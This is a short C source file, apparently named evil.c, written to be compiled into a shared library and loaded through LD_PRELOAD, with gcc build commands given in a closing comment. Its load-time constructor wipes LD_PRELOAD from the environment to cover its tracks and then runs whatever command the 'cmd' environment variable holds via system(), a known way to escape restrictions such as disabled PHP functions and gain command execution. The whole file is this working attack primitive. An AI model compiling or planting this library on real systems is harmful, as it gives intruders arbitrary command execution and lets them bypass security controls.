#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

extern char** environ;

__attribute__((constructor)) void preloadme() {
    const char* cmd = getenv("cmd");
    // unsetenv("LD_PRELOAD");
    int i;
    for (i = 0; environ[i]; ++i) {
        if (strstr(environ[i], "LD_PRELOAD")) {
            environ[i][0] = '\0';
        }
    }
    if (cmd != NULL) {
        system(cmd);
    }
}
/*
gcc -shared -fPIC evil.c -o evil.so
or x86:
gcc -shared -fPIC -m32 evil.c -o evil.so
*/